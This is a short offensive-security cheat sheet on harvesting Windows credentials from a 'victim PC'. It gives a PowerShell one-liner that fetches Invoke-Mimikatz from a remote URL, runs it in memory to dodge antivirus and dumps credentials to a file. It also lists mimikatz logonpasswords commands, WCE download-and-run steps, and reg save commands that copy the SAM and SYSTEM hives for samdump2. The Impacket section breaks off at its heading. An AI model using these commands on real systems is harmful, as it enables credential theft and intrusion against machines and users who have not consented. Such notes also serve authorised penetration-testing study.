# Passwords Extraction and Credential Harvesting

**Using Mimikatz:**
"Mimikatz is an open-source application that allows users to view and save authentication credentials like Kerberos tickets. Benjamin Delpy continues to lead Mimikatz developments, so the toolset works with the current release of Windows and includes the most up-to-date attacks."

A quick one-liner that uses PowerShell to load mimikatz to memory and bypass anti-virus (sometimes...)

```
powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('<https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1>');Invoke-Mimikatz -DumpCreds" > C:\\Users\\%username\\Downloads\\pass.txt
```

Another why is to upload mimikatz to the victims PC and run mimikatz.exe as admin (we need to PE before that..)
By using the following commands:

```
privilege::debug
```

```
log {LOGFILENAME}
```

```
sekurlsa::logonpasswords
```

---

Using WCE:

```
- Download WCE:
	- <https://www.ampliasecurity.com/research/wce_v1_42beta_x64.zip>
- Run as administrator:
	- Wce.exe -w
```

---

Using Samdump2:
On the victim PC run the following commands with high privileges:

```
- Sam and System extract:
	- reg save hklm\\sam c:\\sam
	- reg save hklm\\system c:\\system
```

On our Linux machine run the following command on the files that we got from the victim PC:

```
- Using samdump2:
	- samdump2 system sam
```

---

Using Impacket:
